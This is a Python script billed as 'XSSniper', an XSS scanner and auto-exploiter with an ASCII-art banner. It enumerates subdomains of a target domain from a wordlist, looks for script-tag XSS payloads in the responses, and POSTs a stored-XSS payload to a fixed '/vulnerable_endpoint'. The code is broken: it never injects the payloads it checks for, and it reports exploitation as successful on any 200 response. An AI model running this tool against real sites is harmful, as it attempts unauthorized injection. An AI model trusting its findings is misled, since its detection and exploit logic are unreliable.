import requests
import re
import argparse

def scan_xss(target_domain, wordlist_file):
    # Enumerate subdomains using the provided wordlist
    wordlist = open(wordlist_file, "r")
    subdomains = [subdomain.strip() for subdomain in wordlist]

    # Define the payloads for different types of XSS injection
    payload_reflected = "<script>alert('Reflected XSS')</script>"
    payload_stored = "<script>alert('Stored XSS')</script>"
    payload_dom = "document.body.innerHTML = '<h1>DOM-based XSS</h1>';"

    # ASCII art banner
    print(r"""                           
|_t+.__________________......_  /;_      
;________________/     :    \ t""o.\__   
:---|------------------t-----^-`--'  /   
 \__L___________________\____________\   
              ""-. o .--. \--'/  l  .-t+.
                  \ (   l) ;""   : /     
                    \ `--" o;      Y      
                     """""";:  .-.  ;\     
                           ::  '-'  ;\    
                           ;;      : ;   
                           :: bug   ;|   
                           ;'-------';   
                           '"------""  
__   __ _____ _____       _                 
\ \ / //  ___/  ___|     (_)                
 \ V / \ `--.\ `--. _ __  _ _ __   ___ _ __ 
 /   \  `--. \`--. \ '_ \| | '_ \ / _ \ '__|
/ /^\ \/\__/ /\__/ / | | | | |_) |  __/ |   
\/   \/\____/\____/|_| |_|_| .__/ \___|_|   
                           | |              
                           |_|       
    """)

    # Iterate through each subdomain
    for subdomain in subdomains:
        # Construct the full subdomain URL
        target_url = f"http://{subdomain}.{target_domain}"

        try:
            # Send a GET request to the subdomain URL
            response = requests.get(target_url)

            # Check if the response contains the payload for reflected XSS
            if payload_reflected in response.text:
                print(f"Reflected XSS vulnerability found in {target_url}!")

            # Check if the response contains the payload for stored XSS
            if payload_stored in response.text:
                print(f"Stored XSS vulnerability found in {target_url}!")

            # Check if the response contains the payload for DOM-based XSS
            if payload_dom in response.text:
                print(f"DOM-based XSS vulnerability found in {target_url}!")

            # Exploit the vulnerabilities if found
            if payload_reflected in response.text or payload_stored in response.text or payload_dom in response.text:
                # Exploit the vulnerability by sending a POST request with the payload
                exploit_url = target_url + "/vulnerable_endpoint"
                exploit_data = {"input": payload_stored}
                exploit_response = requests.post(exploit_url, data=exploit_data)

                # Check if the exploitation was successful
                if exploit_response.status_code == 200:
                    print("Exploitation successful!")
                else:
                    print("Exploitation failed.")
            else:
                print(f"No XSS vulnerability found in {target_url}.")
        except requests.exceptions.RequestException:
            print(f"Error accessing {target_url}.")

    # Close the wordlist file
    wordlist.close()

if __name__ == "__main__":
    # Create the argument parser
    parser = argparse.ArgumentParser(description="XSSniper - XSS Scanner and Auto-Exploiter")

    # Add the target domain argument
    parser.add_argument("target_domain", type=str, help="Target domain to scan for XSS vulnerabilities")

    # Add the wordlist file argument
    parser.add_argument("wordlist_file", type=str, help="Wordlist file containing subdomains to enumerate")

    # Parse the arguments
    args = parser.parse_args()

    # Call the scan_xss function with the provided arguments
    scan_xss(args.target_domain, args.wordlist_file)